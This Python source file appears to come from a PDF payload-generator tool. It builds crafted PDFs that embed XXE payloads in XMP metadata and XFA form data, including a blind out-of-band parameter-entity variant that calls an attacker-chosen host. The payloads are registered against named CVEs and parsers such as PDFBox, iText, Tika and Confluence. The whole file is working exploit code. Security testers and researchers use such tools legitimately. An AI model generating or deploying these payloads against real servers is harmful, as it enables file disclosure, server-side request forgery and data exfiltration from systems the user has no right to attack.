from __future__ import annotations

from nonpdf.core.branding import PDF_HEADER_COMMENT
from nonpdf.core.registry import PayloadEntry, registry


def _minimal_with_stream(label: bytes, stream_obj: bytes) -> bytes:
    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /Metadata 5 0 R >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        + b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Courier >> >> >> /Contents 4 0 R >>\nendobj\n"
        + b"4 0 obj\n<< /Length 55 >>\nstream\nBT /F1 22 Tf 30 800 Td (" + label + b") Tj ET\nendstream\nendobj\n"
        + stream_obj
        + b"trailer\n<< /Root 1 0 R /Size 6 >>\n%%EOF\n"
    )


def build_xxe_xmp(host: str) -> bytes:
    payload = (
        '<?xpacket begin="\ufeff" id="W5M0MpCehiHzreSzNTczkc9d"?>\n'
        '<!DOCTYPE foo [\n'
        f'  <!ENTITY xxe SYSTEM "{host}/x-xmp-xxe">\n'
        ']>\n'
        '<x:xmpmeta xmlns:x="adobe:ns:meta/">\n'
        '  <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">\n'
        '    <rdf:Description rdf:about="">\n'
        '      <dc:title xmlns:dc="http://purl.org/dc/elements/1.1/">&xxe;</dc:title>\n'
        '    </rdf:Description>\n'
        '  </rdf:RDF>\n'
        '</x:xmpmeta>\n'
        '<?xpacket end="w"?>'
    ).encode("utf-8")
    obj = (
        b"5 0 obj\n<< /Type /Metadata /Subtype /XML /Length "
        + str(len(payload)).encode() + b" >>\nstream\n"
        + payload + b"\nendstream\nendobj\n"
    )
    return _minimal_with_stream(b"xxe-xmp", obj)


def _xfa_xxe(host: str, endpoint: str, *, oob: bool) -> bytes:
    if oob:
        dtd = (
            '<!DOCTYPE foo [\n'
            f'  <!ENTITY % xxe SYSTEM "{host}/{endpoint}">\n'
            '  %xxe;\n'
            ']>\n'
        )
        body = 'oob'
    else:
        dtd = (
            '<!DOCTYPE foo [\n'
            f'  <!ENTITY xxe SYSTEM "{host}/{endpoint}">\n'
            ']>\n'
        )
        body = '&xxe;'
    xml = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        + dtd
        + '<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">\n'
        + '  <template xmlns="http://www.xfa.org/schema/xfa-template/3.0/">\n'
        + '    <subform name="form1">\n'
        + '      <field name="f1"><value><text>' + body + '</text></value></field>\n'
        + '    </subform>\n'
        + '  </template>\n'
        + '</xdp:xdp>'
    ).encode("utf-8")

    head = b"%PDF-1.7\n" + PDF_HEADER_COMMENT
    return (
        head
        + b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /AcroForm << /XFA 5 0 R >> >>\nendobj\n"
        + b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /MediaBox [0 0 595 842] >>\nendobj\n"
        + b"3 0 obj\n<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Courier >> >> >> /Contents 4 0 R >>\nendobj\n"
        + b"4 0 obj\n<< /Length 55 >>\nstream\nBT /F1 22 Tf 30 800 Td (xxe-xfa) Tj ET\nendstream\nendobj\n"
        + b"5 0 obj\n<< /Length " + str(len(xml)).encode() + b" >>\nstream\n"
        + xml + b"\nendstream\nendobj\n"
        + b"trailer\n<< /Root 1 0 R /Size 6 >>\n%%EOF\n"
    )


def build_xxe_xfa(host: str) -> bytes:
    return _xfa_xxe(host, "x-xfa-xxe", oob=False)


def build_xxe_xfa_oob(host: str) -> bytes:
    return _xfa_xxe(host, "x-xfa-oob", oob=True)


registry.register(PayloadEntry(
    id="E01", name="xxe_xmp",
    builder=lambda host: build_xxe_xmp(host),
    description="XXE in XMP metadata (PDFBox/iText)",
    platform="server", cve="CVE-2016-2175", tags=("xxe",),
))
registry.register(PayloadEntry(
    id="E02", name="xxe_xfa",
    builder=lambda host: build_xxe_xfa(host),
    description="XXE in XFA form data (general entity)",
    platform="server", cve="CVE-2016-2175", tags=("xxe",),
))
registry.register(PayloadEntry(
    id="E03", name="xxe_xfa_oob",
    builder=lambda host: build_xxe_xfa_oob(host),
    description="Blind XXE via OOB parameter entity (Tika/Confluence)",
    platform="server", cve="CVE-2025-66516", tags=("xxe",),
))
